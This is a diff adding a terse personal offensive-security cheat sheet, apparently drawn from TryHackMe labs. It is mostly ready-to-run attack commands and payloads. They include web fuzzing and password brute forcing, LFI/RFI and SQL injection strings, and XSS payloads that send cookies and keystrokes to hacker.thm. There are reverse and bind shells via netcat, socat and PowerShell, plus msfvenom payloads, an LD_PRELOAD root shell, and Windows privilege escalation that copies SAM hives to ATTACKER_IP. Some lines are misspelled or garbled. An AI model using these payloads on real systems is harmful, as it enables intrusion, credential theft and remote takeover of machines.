@@ -1,0 +1,460 @@
+Curl:
+$ curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
+$ curl http://MACHINE_IP -v => verbose
+$ curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+$ curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+$ curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
+
+fuff/dirb/gobuster:
+$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ
+$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP => subdomain enum
+$ user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs {size} => ignore specfified size
+$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists" => user enumeration
+$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200 => Brute force
+$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+$ gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+Local File Inclusion ( LFI )
+
+http://webapp.thm/get.php?file=/etc/passwd
+http://webapp.thm/index.php?lang=../../../../etc/passwd
+include("languages/../../../../../etc/passwd%00").".php");
+http://webapp.thm/index.php?lang=/etc/passwd/
+http://webapp.thm/index.php?lang=/etc/passwd%00
+http://webapp.thm/index.php?lang=../../../../etc/passwd
+....//....//....//....//....//etc/passwd
+?lang=languages/../../../../../etc/passwd
+
+ Remote File Inclusion - RFI 
+
+ /index.php?lang=http://attacker.thm/cmd.txt
+ 
+ Cross stie scriptinf XSS
+ 
+ <script>alert('XSS');</script> => Proof Of Concept:
+ <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script> => Session Stealing
+ <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>  => Key Logger
+ <script>user.changeEmail('attacker@hacker.thm');</script> =>  Business Logic 
+ <script>alert('THM');</script>
+ <script>alert('THM');</script>
+ "><script>alert('THM');</script>
+ </textarea><script>alert('THM');</script>
+ ';alert('THM');//
+ <script>alert('THM');</script> 
+ <sscriptcript>alert('THM');</sscriptcript>
+ <sscriptcript>alert('THM');</sscriptcript>
+ "><script>alert('THM');</script>
+ /images/cat.jpg" onload="alert('THM');
+ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+ 
+ 
+ 
+ 	SQL INJECTION
+SQL main tool
+select * from users;
+select username,password from users;
+select * from users LIMIT 1;
+select * from users where username='admin';
+select * from users where username != 'admin';
+select * from users where username='admin' or username='jon';
+select * from users where username='admin' and password='p4ssword';
+select * from users where username like 'a%';
+select * from users where username like '%n';
+select * from users where username like '%mi%';
+SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
+insert into users (username,password) values ('bob','password123');
+update users SET username='root',password='pass123' where username='admin';
+delete from users where username='martin';
+delete from users;
+
+In-Band SQL Injection
+1 UNION SELECT 1
+0 UNION SELECT 1,2,3
+0 UNION SELECT 1,2,database()
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+
+BYPASS
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+select * from users where username='%username%' and password='%password%' LIMIT 1;
+' OR 1=1;--
+select * from users where username='' and password='' OR 1=1;
+
+Boolean Based 
+select * from users where username = '%username%' LIMIT 1;
+admin123' UNION SELECT 1;-- 
+admin123' UNION SELECT 1,2,3;-- 
+admin123' UNION SELECT 1,2,3 where database() like '%';--
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+
+TIME BASED
+admin123' UNION SELECT SLEEP(5),2;--
+
+NMAP
+
+$ -iL list_of_hosts.txt
+$ -sL list_of_targets.txt
+$ -n => not DNS server
+$ nmap -PR -sn TARGET => ARPreq-> <-ARPrep  /alive
+$ nmap -PE -sn TARGET => ICMP Echoreq-> <-ICMP Echorep /alive
+$ nmap -PP -sn TARGET => ICMP Timestampreq -> ICMP Timestamprep  /alive
+$ nmap -PM -sn TARGET => ICMP Adresse Maskreq -> ICMP Adresse Maskrep  /alive
+$ -PS SYN ping  => SYN -> <-SYN,ACK 
+		   ACK ->     /alive
+		   
+$	=>	SYN-> <-SYN,ACK
+		RST->   /closed
+$ -PA -sn => ACK-> <- RST /closed
+$ -PU -sn => UDP Packet ->  /alive
+	  => UDP Packet ->ICM Type3code3  /closed
+$ -R offline host
+--dns-servers DNS_SERVER
+
+FIN scan
+$nmap -sF TARGET => FIN ->  /open
+		=> FIN -> <- RST,ACK /closed
+		
+Xmas Scan 
+$ -sX TARGET => FIN,PSH,URG ->  /open
+	=> FIN,PSH,URG -> RST,ACK /closed
+
+$TCP Maimon 
+$ -sM TARGET => FIN/ACk -> <- RST /closed or open
+
+TCP ACK scan
+$ -sA  => ACK -> <-RST /closed or open
+
+Window Scan 
+$ -sW => ACK -> <-RST /closed or open
+
+Custom Scan
+$ -scanflags CUSTOM_FLAGS TARGET
+
+Spoofing
+$ -s SPOOFED_IP_MACHINE_IP
+$-e NET_INTERFACE
+$-Pn => disable ping
+common use => 
+$ nmap -e NET_INTERFACE -Pn -S SPOOFED_IP MACHINE_IP
+
+$ -f =>fragment packets, 8bytes
+$ -ff => split data into 16 bytes
+$ -sI ZOMBIE_IP MACHINE_IP 
+
+$ --reason => more details
+$ -v =>verbose
+$ -vv even more verbose
+
+$-sV => collect, determine service
+$ -sV --version-intensity => --version-light => --version-all intensity of 9
+$ -O => OS
+$ --traceroute => find router
+$ -sC => Default script
+
+$--script="http-date"
+/usr/share/nmap/scripts
+	Script Catgeory Description
+	$ auth =>	Authentication related scripts
+	$ broadcast =>	Discover hosts by sending broadcast messages
+	$ brute 	=>Performs brute-force password auditing against logins
+	$ default =>	Default scripts, same as -sC
+	$ discovery => 	Retrieve accessible information, such as database tables and DNS names
+	$ dos => Detects servers vulnerable to Denial of Service (DoS)
+	$ exploit => Attempts to exploit various vulnerable services
+	$ external => Checks using a third-party service, such as Geoplugin and Virustotal
+	$ fuzzer => Launch fuzzing attacks
+	$ intrusive => Intrusive scripts such as brute-force attacks and exploitation
+	$ malware => Scans for backdoors
+	$ safe => Safe scripts that won’t crash the target
+	$ version => Retrieve service versions
+	$ vuln => Checks for vulnerabilities or exploit vulnerable services
+	 
+$ -oN FILENAME
+$ -oG FILENAME => GREPPABLE
+$ -oA => FILENAME
+
+TELNET port 23
+$ telnet MACHINE_IP
+	HTTP => GET index.html -> <-index.html
+FTP port 21
+$ telnet MACHINE_IP 21
+CONTROLE CHANNEL ->	
+DATA CHANNEL ->
+
+$ sudo tcdump port 110 -A => capture some stuff
+
+Password
+/usr/share/wordlists/rockyou.txt
+$ hydra -l username -P wordlist.txt server service
+$ hydra -l mark -P /usr/share/wordlists/rockyou.txt MACHINE_IP ftp
+$ -s PORT => non default port
+$ -V or -vV => verbose
+$ -t => number of parallel
+$ -d => debuggiing, more details
+
+	Protocol 	TCP Port 	Application(s) 	Data Security
+	FTP 	21 	File Transfer 	Cleartext
+	FTPS 	990 	File Transfer 	Encrypted
+	HTTP 	80 	Worldwide Web 	Cleartext
+	HTTPS 	443 	Worldwide Web 	Encrypted
+	IMAP 	143 	Email (MDA) 	Cleartext
+	IMAPS 	993 	Email (MDA) 	Encrypted
+	POP3 	110 	Email (MDA) 	Cleartext
+	POP3S 	995 	Email (MDA) 	Encrypted
+	SFTP 	22 	File Transfer 	Encrypted
+	SSH 	22 	Remote Access and File Transfer 	Encrypted
+	SMTP 	25 	Email (MTA) 	Cleartext
+	SMTPS 	465 	Email (MTA) 	Encrypted
+	Telnet 	23 	Remote Access 	Cleartext
+
+METASPLOIT
+$ msfconsole
+$ root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modulestree -L 1 auxiliary/ 
+$ /opt/metasploit-framework/embedded/framework/modules# tree -L 1 encoders/ 
+=>encode the exploit
+$ root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/
+=> evade antivirus software
+$ root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/
+=> Exploits
+root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/
+=>(No OPeration) do nothing, often used as a buffer
+root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/
+=> run on the target system
+root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 post/
+=>  post-exploitation
+
+msf6 > ls => content folder
+msf6 > history
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 > show options
+msf6 > show payloads
+msf6 > back
+msf6 > info
+msf6 > search
+msf6 > use 0
+msf6 > search typye:auxiloary telnet
+msf6 > unset all
+msf6 > exploit -z => exploit and background the session as soon as it opens
+msf6 > background go bask msfconsole
+msf6 > sessions 
+msf6 > sessions -i 2
+msf6 > use multi/handler
+msf6 > set PAYLOAD
+
+Meterpreter
+$ msfvenom --list payloads | grep meterpreter
+meterpreter > help
+msf6 > irb => ruby shel
+msf6 > load => load 1 or more extension
+msf6 > migrate => meterpreter to another process
+meterpreter > hashdump => ist the content of the SAM database
+meterpreter > search
+meterpretr > shell
+
+Reverse shell
+On attacker
+$ sudo nc -lvnp 443  
+On target
+$ nc <LOCAL-IP> <PORT> -e /bin/bash
+
+Bind Shell
+On Target
+$nc -lvnp <port> -e "cmd.exe"
+On attacker
+$nc MACHINE_IP <port>
+
+$listener
+$sudo rlwrap nc -lvnp 443 => ives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell
+
+ Netcat Shell Stabilisation 
+ step by step
+1.$ python -c 'import pty;pty.spawn("/bin/bash")'
+2.$ export TERM=xterm
+3.Ctrl+Z $ stty raw -echo; fg => turns off our own terminal echo + gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes
+3.bis or Ctrl+z $ stty raw -echo; fg
+
+$ sudo python3 -m http.server 80 => create server
+$ wget <LOCAL-IP>/socat -O /tmp/socat => download
+$ Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe => same things with windows 
+$ stty rows <number>
+$ stty cols <number>
+
+socat reverse shell
+Attacker
+$ socat TCP-L:<port> -
+On windows
+$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+Equivalent 
+$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+
+socat blind shell
+target
+linux:$ socat TCP-L:<PORT> EXEC:"bash -li"
+windows:$ socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+attacker
+$socat TCP:<TARGET-IP>:<TARGET-PORT> -
+
+
+$ socat TCP-L:<port> FILE:`tty`,raw,echo=0 => listener no need stabailization
+$ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+    -pty, allocates a pseudoterminal on the target -- part of the stabilisation process
+    -stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
+    -sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
+    -setsid, creates the process in a new session
+    -sane, stabilises the terminal, attempting to "normalise" it.
+   
+Encrypted shell
+	Reverse shell
+$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+$ cat shell.key shell.crt > shell.pem
+$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - => verify=0 tells the connection to not bother trying to validate that our certificate 
+$ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+	Bind shell
+Target:
+$socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+Attacker:
+$socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+
+Common Shell Payloads 
+bind shell
+$ mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+reverse shell
+$ mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+$ msfvenom -p <PAYLOAD> <OPTIONS>
+$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port> => Windows x64reverseshell
+$ <OS>/<arch>/<payload> => naming convetion
+$ windows/shell_reverse_tcp => exception for 32 bit
+$ linux/x86/shell_reverse_tcp => 86bit
+$ shell_reverse_tcp => stageless payload
+
+Webshells
+
+$ <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> => php reverse shell
+/usr/share/webshells*
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+$ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
+=> his would be copied into the URL as the cmd argument
+
+/home/<user>/.ssh => ssh stored
+C:\Program Files\FileZilla Server\FileZilla Server.xml => in windows
+C:\xampp\FileZilla Server\FileZilla Server.xml => in windows
+
+$ net user <username> <password> /add
+$ net localgroup administrators <username> /add
+
+	Linux privilege escalation
+$ hostname
+$ uname -a => hostname of the target machine
+$ /proc/version => information on the kernel version
+$ /etc/issue =>  nformation about the operating system
+$ ps => process
+$ ps -A => all runninf process
+$ ps axjf => tree process
+$ ps aux => process for all user
+$ env => var env
+$ /etc/passwd => user and others
+$ history
+$ ip route => which network routes exist
+$ netstat -a => listening port & established connection
+$ netcat -at or netcat -au => list TCP or UDP protocols
+$ netstat -l => listening mode
+$ netstat -lt => only port with tco
+$ netstat -s => statics protocol
+$ netstat -tp => list connection with PID and name
+$ netstat -i => interface static
+$ netstat -ano => -a display socket -n do not resolve names -o display timers
+$ find . -name flag.txt => file name flag
+$ find /home -name flag.txt => in home directory
+$ find / -type d -name config => directory name config under /
+$ find / -type f -perm 0777 =>with perm 777
+$ find / -perm a=x => find executable files
+$ find /home -user frank => find all files for user “frank” under “/home”
+$ find / -mtime 10 => find files that were modified in the last 10 days
+$ find / -atime 10 => find files that were accessed in the last 10 day
+$ find / -cmin -60 => find files changed within the last hour (60 minutes)
+$ find / -amin -60 => find files accesses within the last hour (60 minutes)
+$ find / -size 50M => find files with a 50 MB size
+$ find / -writable -type d 2>/dev/null => Find world-writeable folders
+$ find / -perm -222 -type d 2>/dev/null => Find world-writeable folders
+$ find / -perm -o w -type d 2>/dev/null => Find world-writeable folders
+$ find / -perm -o x -type d 2>/dev/null => Find world-executable folders
+$ find / -name perl*
+$ find / -name python*
+$ find / -name gcc*
+$ find / -perm -u=s -type f 2>/dev/null
+$ find / -type f -perm -04000 -ls 2>/dev/null =>list files that have SUID or SGID bits set.
+$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+$ sudo -l => check its current situation related to root privilege
+	
+	LD_PRELOAD is a function that allows any program to use shared libraries.
+	C code for LD_Preload
+			#include <stdio.h>
+			#include <sys/types.h>
+			#include <stdlib.h>
+
+			void _init() {
+			unsetenv("LD_PRELOAD");
+			setgid(0);
+			setuid(0);
+			system("/bin/bash");
+			}
+	$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+	$ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+
+$getcap => tool to list enabled capabilities.
+$ cat /etc/crontab
+
+PATH:
+$ echo $PATH => path way execution
+$ export PATH= $PATH:/tmp
+
+	Windows Escalation Privilege
+
+C:\>  type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+if powershell
+C:\>  type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+C:\>   cmdkey /list => crdential
+C:\>  runas /savecred /user:admin cmd.exe => see password
+C:\>  type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString 
+
+CC:\>  reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s 
+=> retrieve stored proxy credential
+C:\>  schtasks /query /tn vulntask /fo list /v => information about the task
+C:\> icacls c:\tasks\schtask.bat => heck the file permissions on the executable
+C:\>  secho c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat=> reverse shelle with nc -lvp 4444 in attacker machine
+
+	C:/> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer => This could potentially allow us to generate a malicious MSI file
+	Attacker $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.94.87 LPORT=LOCAL_PORT -f msi -o malicious.msi
+	C:/>  msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+	
+C:\>  sc [<ServerName>] qc [<ServiceName>] [<BufferSize>]
+All of the services configurations are stored on the registry under HKLM\SYSTEM\CurrentControlSet\Services\
+C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
+        Successfully processed 1 files.
+	Overwirite exempl:
+	C:\> cd C:\PROGRA~2\SYSTEM~1\
+	C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
+		1 file(s) moved.
+	C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+		1 file(s) moved.
+C:\>  sc stop windowsscheduler
+C:\> sc start windowsscheduler => often necesseray to do thiqs for overwrite
+"C:\Program Files\RealVNC\VNC Server\vncserver.exe" => Damn
+
+C:\>  whoami /priv => mY rigt
+	C:\> eg save hklm\system C:\Users\THMBackup\system.hive
+	The operation completed successfully.
+	C:\>reg save hklm\sam C:\Users\THMBackup\sam.hive
+	The operation completed successfully.
+	C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+	C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+	=>Copy to our machine and ..
+	user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+C:\>wmic product get name,version,vendor => ump information it can gather on installed software
+some usefull script => WinPEAS, PrivescCheck, WES-NG, Metasploit.
